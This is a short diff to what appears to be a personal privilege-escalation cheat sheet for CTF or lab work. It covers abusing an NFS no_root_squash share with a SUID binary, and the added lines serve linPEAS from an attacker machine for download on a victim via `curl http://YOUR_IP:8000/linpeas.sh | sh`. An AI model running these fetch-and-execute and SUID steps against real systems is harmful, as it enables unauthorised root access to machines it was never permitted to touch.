@@ -112,3 +112,9 @@ int main()
 - 4- Give the nfs script file SUID bit, {`chmod +s nfs`} 
 - 5- Move both nfs and nfs.c files to the directory we made earlier, in this case /tmp/backupsonattackermachine
 - 6-Go to the target machine and execute `./nfs` in the directory with the no_root_squash that we chose
+
+
+**SERVING LINPEAS TO VICTIM MACHINE**
+1- on the attacker machine: `cd ~/tools/privesc/PEASS-ng/linPEAS` THEN `python3 -m http.server 8000`
+2- on the victim machine: `curl http://YOUR_IP:8000/linpeas.sh | sh` OR `wget http://YOUR_IP:8000/linpeas.sh -O /tmp/linpeas.sh` then chmod +x
+3- activate using `./linpeas.sh`
